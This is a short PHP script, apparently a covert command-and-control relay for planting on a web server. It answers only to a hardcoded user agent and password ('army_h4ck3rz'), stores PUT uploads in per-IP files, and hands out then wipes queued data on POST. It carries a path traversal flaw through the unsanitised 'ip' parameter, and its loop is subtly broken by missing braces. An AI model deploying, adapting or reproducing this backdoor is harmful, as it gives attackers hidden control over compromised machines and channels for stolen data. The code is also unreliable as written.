<?php
	if($_SERVER['HTTP_USER_AGENT']!="AlMA.PRO-PortHP"){die();}
	if(!isset($_GET['pass'])){die();}
	if($_GET['pass']!="army_h4ck3rz"){die();}
	if($_SERVER['REQUEST_METHOD'] == 'POST'){
		set_time_limit(0);
		if(isset($_POST['ip'])){
			if (!file_exists("data_".$_POST['ip'].".txt")){die();}
			print(file_get_contents("data_".$_POST['ip'].".txt"));
			file_put_contents("data_".$_POST['ip'].".txt", "");
		}
	}elseif($_SERVER['REQUEST_METHOD'] == 'PUT'){
		if(isset($_GET['ip'])){
			set_time_limit(0);
			$dr = fopen("php://input","r");
			if (!file_exists("mdata_".$_GET['ip'].".txt")){file_put_contents("mdata_".$_GET['ip'].".txt", "");}
			while ($data = fread($dr, 1024))
				$dt=file_get_contents("mdata_".$_GET['ip'].".txt").$data."\n";
				file_put_contents("mdata_".$_GET['ip'].".txt", $dt);
			fclose($dr);
			die("done"); #Sending signal to the control that we're done.
		}
	}
?>